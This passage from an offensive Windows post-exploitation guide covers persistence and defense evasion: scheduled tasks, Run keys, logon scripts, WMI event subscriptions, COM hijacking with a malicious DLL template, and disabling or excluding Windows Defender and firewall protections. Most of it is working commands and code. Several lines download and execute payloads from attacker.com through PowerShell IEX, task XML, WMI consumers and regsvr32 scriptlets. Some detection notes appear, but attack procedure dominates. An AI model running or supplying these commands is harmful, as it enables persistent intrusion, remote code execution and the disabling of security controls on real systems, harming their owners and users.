# Create with multiple triggers
schtasks /create /tn "SysMonitor" /tr "C:\Windows\Temp\monitor.exe" /sc onstart /ru SYSTEM
schtasks /change /tn "SysMonitor" /tr "C:\Windows\Temp\monitor.exe" /rl highest
# Add additional logon trigger manually via Task Scheduler GUI or XML import
```

#### XML-Based Task Creation

**Export and Modify Template:**

cmd

```cmd
# Export existing task
schtasks /query /tn "Microsoft\Windows\AppID\SmartScreenSpecific" /xml > template.xml

# Modify XML to change executable path and triggers
# Import modified task
schtasks /create /tn "SmartScreenUpdate" /xml template.xml /ru SYSTEM
```

**Custom XML Task:**

xml

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "IEX(IWR('http://attacker.com/payload'))"</Arguments>
    </Exec>
  </Actions>
</Task>
```

cmd

```cmd
# Import XML task
schtasks /create /tn "WindowsTelemetry" /xml custom_task.xml
```

#### Remote Task Creation

**PsExec Remote Scheduling:**

cmd

```cmd
# Create task on remote system
psexec.exe \\target_host -u DOMAIN\admin -p password schtasks /create /tn "Update" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM
```

**PowerShell Remoting:**

powershell

```powershell
# Create task via PS remoting
Invoke-Command -ComputerName target_host -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "C:\payload.exe"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "SystemCore" -Action $action -Trigger $trigger -User "SYSTEM"
}
```

**Impacket atexec:**

bash

```bash
# Create scheduled task remotely
atexec.py DOMAIN/admin:password@target_host 'schtasks /create /tn "Update" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM /f'
```

#### Task Enumeration and Cleanup

**List All Tasks:**

cmd

```cmd
# Basic listing
schtasks /query /fo LIST /v

# Filter by task name
schtasks /query /tn "TaskName" /fo LIST /v

# Export all tasks to CSV
schtasks /query /fo CSV /v > tasks.csv
```

**Delete Task:**

cmd

```cmd
# Delete specific task
schtasks /delete /tn "TaskName" /f

# PowerShell deletion
Unregister-ScheduledTask -TaskName "TaskName" -Confirm:$false
```

#### Detection Artifacts

**Task Locations:**

- Registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`
- Filesystem: `C:\Windows\System32\Tasks\` (XML definitions)
- Event logs: `Microsoft-Windows-TaskScheduler/Operational`

**Key Event IDs:**

- 106: Task registered
- 140: Task updated
- 141: Task deleted
- 200/201: Task executed/completed

**[Inference]** Suspicious task indicators include SYSTEM context execution, hidden settings, unusual trigger combinations, or tasks mimicking legitimate Microsoft task names with slight variations.

---

### Logon Script Persistence

Logon scripts execute automatically when users authenticate, providing reliable persistence tied to user activity. Scripts can be configured through Group Policy, registry modifications, or Active Directory user properties.

#### User-Level Logon Scripts

**Registry UserInitMprLogonScript:**

cmd

```cmd
# Set logon script for current user
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\logon.bat" /f

# Set for specific user (requires admin)
reg add "HKU\<SID>\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\logon.bat" /f
```

**PowerShell Registry Method:**

powershell

```powershell
# Add logon script to current user
Set-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "powershell.exe -WindowStyle Hidden -File C:\Users\Public\script.ps1"

# Verify setting
Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"
```

#### System-Level Logon Scripts

**Userinit Registry Key:**

cmd

```cmd
# Original value: C:\Windows\system32\userinit.exe,
# Append payload while preserving functionality
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\payload.exe" /f
```

**[Unverified]** The Userinit value processes comma-separated executables sequentially, but modifications are highly visible to security tools monitoring this critical registry location.

**Shell Registry Key:**

cmd

```cmd
# Replace explorer.exe shell (extreme persistence)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\payload.exe" /f

# Restore original
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
```

#### GPO-Based Logon Scripts

**Local Group Policy Editor:**

powershell

```powershell
# Create logon script
$scriptPath = "C:\Windows\System32\GroupPolicy\User\Scripts\Logon"
New-Item -Path $scriptPath -ItemType Directory -Force
Copy-Item payload.ps1 -Destination "$scriptPath\startup.ps1"

# Configure via registry (simulates GPO)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" /v Script /t REG_SZ /d "startup.ps1" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" /v Parameters /t REG_SZ /d "" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" /v IsPowershell /t REG_DWORD /d 1 /f
```

**Domain GPO Script (Requires Domain Admin):**

powershell

```powershell
# Add to domain GPO logon script
# Manually: GPMC → Edit GPO → User Configuration → Policies → Windows Settings → Scripts → Logon
# Script path: \\domain.com\SYSVOL\domain.com\Policies\{GPO-GUID}\User\Scripts\Logon\
```

#### Run/RunOnce Registry Keys

**Standard Run Keys:**

cmd

```cmd
# HKCU Run (user-level, no admin required)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# HKLM Run (system-level, requires admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemCore" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# RunOnce (executes once then deletes itself)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Install" /t REG_SZ /d "powershell.exe -enc <base64>" /f
```

**PowerShell Registry Method:**

powershell

```powershell
# Add to Run key with obfuscation
$payload = "powershell.exe -WindowStyle Hidden -Command IEX(IWR('http://attacker.com/stage2'))"
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value $payload -PropertyType String -Force
```

**Less Common Run Locations:**

cmd

```cmd
# RunServices (executes before logon)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /v "Service" /t REG_SZ /d "C:\payload.exe" /f

# RunServicesOnce
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v "Setup" /t REG_SZ /d "C:\payload.exe" /f

# Policies Run keys (often overlooked)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "Update" /t REG_SZ /d "C:\payload.exe" /f
```

#### Startup Folder Persistence

**User Startup Folder:**

cmd

```cmd
# Copy payload to startup folder
copy payload.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"

# Create shortcut (.lnk) in startup
powershell "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk'); $SC.TargetPath = 'C:\Windows\Temp\payload.exe'; $SC.Save()"
```

**All Users Startup Folder:**

cmd

```cmd
# Requires admin privileges
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\System.exe"
```

#### WMI Event Subscription Persistence

**Permanent WMI Event Consumer:**

powershell

```powershell
# Create filter (trigger condition)
$filterName = "SystemStartupFilter"
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}

# Create consumer (action)
$consumerName = "SystemStartupConsumer"
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command IEX(IWR('http://attacker.com/payload'))"
}

# Bind filter to consumer
$bind = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Logon-Based WMI Trigger:**

powershell

```powershell
# Trigger on user logon event
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "UserLogonFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
}
```

#### Detection Evasion

**Timestomping Registry Keys:**

powershell

```powershell
# Modify registry key timestamps (requires low-level API manipulation)
# Note: Standard PowerShell cannot directly modify registry timestamps
# Use specialized tools like SetRegTime or custom C# code
```

**Binary Padding and Obfuscation:**

cmd

```cmd
# Add junk data to executable to change hash
copy /b payload.exe+random_data.bin obfuscated_payload.exe
```

**[Inference]** Legitimate-looking names mimicking Windows components ("WindowsDefenderUpdate", "MicrosoftEdgeCore") reduce manual inspection likelihood, though behavioral analysis remains effective.

#### Remote Logon Script Deployment

**PsExec Registry Modification:**

cmd

```cmd
# Add Run key remotely
psexec.exe \\target_host -u DOMAIN\admin -p password reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

**PowerShell Remoting:**

powershell

```powershell
Invoke-Command -ComputerName target_host -ScriptBlock {
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor" -Value "C:\payload.exe" -Force
}
```

---

### COM Registry Objects

Component Object Model (COM) hijacking leverages Windows COM registration to achieve persistence by redirecting legitimate COM object instantiation to malicious code. This technique operates at the application layer, often bypassing traditional persistence detection.

#### COM Hijacking Fundamentals

**COM Registration Structure:**

- CLSID: Unique identifier for COM classes (`{GUID}`)
- InprocServer32: DLL path for in-process COM servers
- LocalServer32: EXE path for out-of-process COM servers
- Registry locations: `HKCR\CLSID\{GUID}`, `HKCU\Software\Classes\CLSID\{GUID}`, `HKLM\SOFTWARE\Classes\CLSID\{GUID}`

**HKCU vs HKCR Priority:**

```
HKCU\Software\Classes\CLSID (user-level, no admin required, highest priority)
HKLM\SOFTWARE\Classes\CLSID (system-level, requires admin)
HKCR\CLSID (merged view of HKLM and HKCU)
```

#### Identifying Hijackable COM Objects

**Search for Missing COM References:**

powershell

```powershell
# Find CLSIDs with InprocServer32 paths that don't exist
Get-ChildItem -Path "Registry::HKCU\Software\Classes\CLSID" -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object {
        $path = Get-ItemProperty -Path "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty "(default)"
        if ($path -and !(Test-Path $path)) {
            [PSCustomObject]@{
                CLSID = $_.PSChildName
                Path = $path
            }
        }
    }
```

**Process Monitor COM Analysis:**

```
1. Run Procmon.exe with filter: "Operation is RegOpenKey" AND "Path contains CLSID"
2. Perform common user actions (open applications, documents)
3. Identify frequently accessed CLSIDs
4. Check if HKCU override possible for found CLSIDs
```

#### COM Hijacking Implementation

**Basic InprocServer32 Hijack:**

cmd

```cmd
# Create CLSID entry in HKCU (example: hijack taskband object)
reg add "HKCU\Software\Classes\CLSID\{01E2E7C3-D49D-4e65-B57E-A2C1D4F7B1D8}" /ve /d "Hijacked COM Object" /f

# Set malicious DLL path
reg add "HKCU\Software\Classes\CLSID\{01E2E7C3-D49D-4e65-B57E-A2C1D4F7B1D8}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\malicious.dll" /f

# Set threading model (required)
reg add "HKCU\Software\Classes\CLSID\{01E2E7C3-D49D-4e65-B57E-A2C1D4F7B1D8}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
```

**PowerShell COM Hijack:**

powershell

```powershell
# Target: Schedule Service COM object (frequently instantiated)
$clsid = "{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"
$key = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"

New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Force
New-Item -Path $key -Force
Set-ItemProperty -Path $key -Name "(default)" -Value "C:\Users\Public\payload.dll"
Set-ItemProperty -Path $key -Name "ThreadingModel" -Value "Apartment"
```

#### Common Hijackable CLSIDs

**High-Value Targets:**

```
{BCDE0395-E52F-467C-8E3D-C4579291692E} - MMDeviceEnumerator (audio device enumeration, frequent)
{0002DF01-0000-0000-C000-000000000046} - Internet Explorer browsing context
{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A} - Printer queue monitoring
{6D5140C1-7436-11CE-8034-00AA006009FA} - Service Control Manager
{42aedc87-2188-41fd-b9a3-0c966feabec1} - MsSettings (Windows Settings app)
```

**[Unverified]** Some sources list specific CLSIDs as universally hijackable, but actual hijackability depends on whether the CLSID is checked in HKCU first and whether the parent process has sufficient permissions.

#### DLL Payload Requirements

**Minimal DLL Template (C++):**

cpp

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Execute payload here
            WinExec("cmd.exe /c powershell.exe -enc <base64>", SW_HIDE);
            break;
    }
    return TRUE;
}

// Export DllGetClassObject for COM compatibility
extern "C" __declspec(dllexport) HRESULT DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    return CLASS_E_CLASSNOTAVAILABLE;
}
```

**Compile with MinGW:**

bash

```bash
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -luser32
```

**Proxy Execution to Legitimate DLL:**

cpp

```cpp
// Forward COM calls to legitimate DLL after payload execution
HMODULE hLegitDll = LoadLibrary("C:\\Windows\\System32\\legitimate.dll");
if (hLegitDll) {
    typedef HRESULT (*DllGetClassObjectFunc)(REFCLSID, REFIID, LPVOID*);
    DllGetClassObjectFunc originalFunc = (DllGetClassObjectFunc)GetProcAddress(hLegitDll, "DllGetClassObject");
    if (originalFunc) {
        return originalFunc(rclsid, riid, ppv);
    }
}
```

#### TreatAs Registry Redirection

**Redirect COM Object to Another CLSID:**

cmd

```cmd
# Point one CLSID to another (controlled) CLSID
reg add "HKCU\Software\Classes\CLSID\{target-CLSID}\TreatAs" /ve /t REG_SZ /d "{malicious-CLSID}" /f

# Implement malicious-CLSID with payload DLL
reg add "HKCU\Software\Classes\CLSID\{malicious-CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\payload.dll" /f
```

#### Scriptlet COM Hijacking

**Register Scriptlet (.sct) File:**

xml

```xml
<!-- malicious.sct -->
<?XML version="1.0"?>
<scriptlet>
<registration
    description="Scriptlet COM"
    progid="ScriptletCOM"
    version="1.00"
    classid="{target-CLSID}"
    remotable="true">
</registration>
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell.exe -WindowStyle Hidden -Command IEX(IWR('http://attacker.com/payload'))");
]]>
</script>
</scriptlet>
```

cmd

```cmd
# Register scriptlet
regsvr32 /u /s /i:http://attacker.com/malicious.sct scrobj.dll
```

#### Detection Artifacts

**Registry Monitoring:**

powershell

```powershell
# Monitor CLSID changes in HKCU
Get-ItemProperty -Path "HKCU:\Software\Classes\CLSID\*\InprocServer32" -ErrorAction SilentlyContinue | 
    Where-Object { $_.'(default)' -notmatch "System32|SysWOW64" }
```

**Sysmon Event Filtering:**

xml

```xml
<!-- Sysmon config for COM hijacking detection -->
<RuleGroup name="COM Hijacking" groupRelation="or">
    <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\Software\Classes\CLSID\</TargetObject>
        <TargetObject condition="contains">\InprocServer32\</TargetObject>
    </RegistryEvent>
</RuleGroup>
```

**[Inference]** Legitimate COM registrations typically reference DLLs in `System32` or `Program Files`, while user-writable paths (`AppData`, `Public`, `Temp`) indicate potential hijacking.

---

### Windows Defender Exclusion

Windows Defender exclusions allow specified files, folders, processes, or file extensions to bypass real-time protection and scanning. While requiring administrator privileges to configure, exclusions provide reliable evasion for persistent payloads.

#### Checking Current Exclusions

**PowerShell Defender Module:**

powershell

```powershell
# List all exclusions
Get-MpPreference | Select-Object -Property Exclusion*

# Specific exclusion types
Get-MpPreference | Select-Object ExclusionPath
Get-MpPreference | Select-Object ExclusionExtension
Get-MpPreference | Select-Object ExclusionProcess
```

**Registry Exclusion Locations:**

powershell

```powershell
# Path exclusions
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue

# Extension exclusions
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" -ErrorAction SilentlyContinue

# Process exclusions
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -ErrorAction SilentlyContinue
```

#### Adding Exclusions

**Path Exclusions:**

powershell

```powershell
# Exclude specific file
Add-MpPreference -ExclusionPath "C:\Users\Public\payload.exe"

# Exclude entire directory
Add-MpPreference -ExclusionPath "C:\Windows\Temp\"

# Multiple paths
Add-MpPreference -ExclusionPath "C:\Users\Public\","C:\ProgramData\Updates\"
```

**Extension Exclusions:**

powershell

```powershell
# Exclude file extension
Add-MpPreference -ExclusionExtension "exe"

# Multiple extensions
Add-MpPreference -ExclusionExtension "dll","ps1","vbs"
```

**Process Exclusions:**

powershell

```powershell
# Exclude process (any file executed by this process bypasses scanning)
Add-MpPreference -ExclusionProcess "powershell.exe"

# Exclude custom process
Add-MpPreference -ExclusionProcess "C:\Users\Public\updater.exe"
```

#### Registry-Based Exclusion Modification

**Direct Registry Addition:**

cmd

```cmd
# Add path exclusion via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp\" /t REG_DWORD /d 0 /f

# Add extension exclusion
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d "0" /f

# Add process exclusion
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "powershell.exe" /t REG_DWORD /d 0 /f
```

**PowerShell Registry Method:**

powershell

```powershell
# Add multiple path exclusions
$exclusions = @("C:\Users\Public\", "C:\Windows\Temp\", "C:\ProgramData\")
$key = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"

foreach ($path in $exclusions) {
    New-ItemProperty -Path $key -Name $path -Value 0 -PropertyType DWord -Force
}
```

#### Disabling Windows Defender Components

**Disable Real-Time Protection:**

powershell

```powershell
# Temporarily disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Disable IOAV protection (scanning of downloaded files)
Set-MpPreference -DisableIOAVProtection $true

# Disable script scanning
Set-MpPreference -DisableScriptScanning $true
```

**[Unverified]** Real-time protection disablement typically auto-reverts after system restart or through tamper protection mechanisms on Windows 10 1903+ unless tamper protection is disabled first.

**Disable Tamper Protection:**

powershell

```powershell
# Check tamper protection status
Get-MpComputerStatus | Select-Object IsTamperProtected

# Disable via registry (may require Safe Mode on recent Windows)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
```

**Group Policy Defender Disablement:**

cmd

```cmd
# Disable Windows Defender via registry (simulates GPO)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Disable real-time protection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time
Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

# Disable on-access protection

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f

# Disable scanning on downloads
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
```

#### Attack Surface Reduction (ASR) Rules Bypass

**List ASR Rules:**
```powershell
# View configured ASR rules
Get-MpPreference | Select-Object AttackSurfaceReductionRules_*

# Alternative method
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
````

**Disable Specific ASR Rules:**

powershell

```powershell
# Common ASR rule GUIDs
$blockOfficeChildProcess = "d4f940ab-401b-4efc-aadc-ad5f3c50688a"
$blockOfficeInjection = "75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84"
$blockUntrustedUSB = "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4"

# Set rule to audit mode (0=Disabled, 1=Block, 2=Audit)
Add-MpPreference -AttackSurfaceReductionRules_Ids $blockOfficeChildProcess -AttackSurfaceReductionRules_Actions Disabled
```

**Registry ASR Modification:**

cmd

```cmd
# Disable ASR rule via registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR" /v ExploitGuard_ASR_Rules /t REG_DWORD /d 0 /f
```

#### Cloud-Delivered Protection Bypass

**Disable Cloud Protection:**

powershell

```powershell
# Disable MAPS (Microsoft Active Protection Service)
Set-MpPreference -MAPSReporting Disabled

# Disable automatic sample submission
Set-MpPreference -SubmitSamplesConsent NeverSend

# Registry method
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
```

#### Defender Service Manipulation

**Stop Defender Services:**

cmd

```cmd
# Stop WinDefend service
sc stop WinDefend
sc config WinDefend start= disabled

# Stop Security Center service
sc stop wscsvc
sc config wscsvc start= disabled

# Stop Defender update service
sc stop WdNisSvc
sc config WdNisSvc start= disabled
```

**[Unverified]** Service manipulation often fails on modern Windows due to service protection mechanisms (protected services) that prevent unauthorized modifications even with administrator privileges.

**Delete Defender Definition Files:**

cmd

```cmd
# Remove signature definitions (forces outdated detection)
del /F /Q "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\*"
```

#### Remote Defender Configuration

**PsExec Remote Exclusion:**

cmd

```cmd
# Add exclusion on remote system
psexec.exe \\target_host -u DOMAIN\admin -p password powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp\'"
```

**PowerShell Remoting:**

powershell

```powershell
# Configure exclusion remotely
Invoke-Command -ComputerName target_host -ScriptBlock {
    Add-MpPreference -ExclusionPath "C:\Users\Public\"
    Set-MpPreference -DisableRealtimeMonitoring $true
}
```

**Group Policy Exclusion Deployment:**

```
1. Domain Controller: GPMC → Create/Edit GPO
2. Computer Configuration → Policies → Administrative Templates → Windows Components → Windows Defender Antivirus → Exclusions
3. Configure "Path Exclusions" with semicolon-separated paths
4. Deploy to target OUs
```

#### Detection Evasion Techniques

**Legitimate-Looking Exclusion Paths:**

powershell

```powershell
# Exclude paths that appear system-related
Add-MpPreference -ExclusionPath "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\"
Add-MpPreference -ExclusionPath "C:\Program Files\WindowsApps\Microsoft.WindowsStore_*"
```

**Wildcard Exclusions:**

powershell

```powershell
# Exclude all subdirectories
Add-MpPreference -ExclusionPath "C:\Users\*\AppData\Local\Temp\"

# Exclude by pattern
Add-MpPreference -ExclusionExtension "tmp","log"
```

#### Verification and Testing

**Trigger Defender Scan:**

powershell

```powershell
# Manual scan of specific file
Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\Public\payload.exe"

# Quick scan
Start-MpScan -ScanType QuickScan

# Check detection history
Get-MpThreatDetection
```

**EICAR Test File:**

cmd

```cmd
# Create EICAR test string (should be detected if Defender active)
echo X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* > eicar.txt

# Test in excluded directory
copy eicar.txt C:\Windows\Temp\eicar.txt
```

#### Detection Artifacts

**Event Logs:**

- Event ID 5007: Windows Defender configuration change
- Event ID 5001: Real-time protection disabled
- Event ID 5013: Exclusion added

**Monitoring Exclusion Changes:**

powershell

```powershell
# Watch for exclusion modifications
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | 
    Where-Object { $_.Id -eq 5007 -and $_.Message -match "Exclusion" } |
    Select-Object TimeCreated, Message
```

---

### Firewall Rule Exceptions

Windows Firewall rule modifications allow persistent network access for command and control (C2) communications, remote administration tools, and backdoors. Firewall rules can be configured for inbound/outbound traffic with granular control over ports, protocols, and applications.

#### Checking Firewall Status

**Verify Firewall State:**

powershell

```powershell
# Check firewall profiles
Get-NetFirewallProfile | Select-Object Name, Enabled

# Check specific profile
Get-NetFirewallProfile -Name Domain | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
```

**Command Line Status Check:**

cmd

```cmd
# Display all profiles
netsh advfirewall show allprofiles

# Domain profile specifically
netsh advfirewall show domain state
```

#### Creating Inbound Firewall Rules

**Allow Specific Port:**

powershell

```powershell
# Allow inbound TCP port 4444
New-NetFirewallRule -DisplayName "Remote Management" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow

# Allow UDP port range
New-NetFirewallRule -DisplayName "Service Port Range" -Direction Inbound -Protocol UDP -LocalPort 5000-5100 -Action Allow

# Allow all protocols on specific port
New-NetFirewallRule -DisplayName "Custom Service" -Direction Inbound -LocalPort 8080 -Action Allow
```

**Allow Specific Program:**

powershell

```powershell
# Allow executable inbound connections
New-NetFirewallRule -DisplayName "System Service" -Direction Inbound -Program "C:\Windows\Temp\service.exe" -Action Allow

# Allow with specific profile
New-NetFirewallRule -DisplayName "Domain Tool" -Direction Inbound -Program "C:\Users\Public\tool.exe" -Action Allow -Profile Domain
```

**netsh Command Equivalent:**

cmd

```cmd
# Add inbound rule for port
netsh advfirewall firewall add rule name="Remote Access" dir=in action=allow protocol=TCP localport=4444

# Add rule for program
netsh advfirewall firewall add rule name="System Update" dir=in action=allow program="C:\Windows\Temp\update.exe"

# Add rule for service
netsh advfirewall firewall add rule name="Management Service" dir=in action=allow service="servicename"
```

#### Creating Outbound Firewall Rules

**Allow Outbound Connections:**

powershell

```powershell
# Allow outbound TCP to specific port
New-NetFirewallRule -DisplayName "Update Service" -Direction Outbound -Protocol TCP -RemotePort 443 -Action Allow

# Allow program outbound access
New-NetFirewallRule -DisplayName "Backup Tool" -Direction Outbound -Program "C:\Users\Public\backup.exe" -Action Allow

# Allow to specific IP range
New-NetFirewallRule -DisplayName "Internal Communication" -Direction Outbound -RemoteAddress 192.168.1.0/24 -Action Allow
```

**netsh Outbound Rules:**

cmd

```cmd
# Outbound port rule
netsh advfirewall firewall add rule name="C2 Channel" dir=out action=allow protocol=TCP remoteport=8443

# Outbound program rule
netsh advfirewall firewall add rule name="Agent" dir=out action=allow program="C:\Windows\System32\agent.exe"
```

#### Advanced Rule Configuration

**Multiple Parameters:**

powershell

```powershell
# Complex rule with multiple conditions
New-NetFirewallRule -DisplayName "Secure Management" `
    -Direction Inbound `
    -Protocol TCP `
    -LocalPort 3389 `
    -RemoteAddress 10.0.0.0/8 `
    -Action Allow `
    -Profile Domain,Private `
    -Enabled True `
    -Description "Remote desktop from internal network"
```

**Port Forwarding Rule:**

powershell

```powershell
# Enable port forwarding (requires netsh)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1

# Create firewall rule for forwarded port
New-NetFirewallRule -DisplayName "Port Forward" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
```

**Service-Specific Rules:**

cmd

```cmd
# Allow rule for specific service
netsh advfirewall firewall add rule name="Service Access" dir=in action=allow service="RemoteRegistry" enable=yes

# Allow RDP (standard)
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
```

#### Blocking Rules for Defense Evasion

**Block Security Tools:**

powershell

```powershell
# Block outbound connections for security software
New-NetFirewallRule -DisplayName "Update Block" -Direction Outbound -Program "C:\Program Files\Windows Defender\MpCmdRun.exe" -Action Block

# Block telemetry/logging endpoints
New-NetFirewallRule -DisplayName "Privacy" -Direction Outbound -RemoteAddress 65.52.108.33 -Action Block
```

**Block Inbound Security Scans:**

cmd

```cmd
# Block common scanning ports
netsh advfirewall firewall add rule name="Block Scan" dir=in action=block protocol=TCP localport=135,139,445

# Block ICMP (ping)
netsh advfirewall firewall add rule name="Block ICMP" dir=in action=block protocol=icmpv4
```

#### Stealth Rule Configuration

**Hidden/Obscured Rule Names:**

powershell

```powershell
# Use legitimate-sounding names
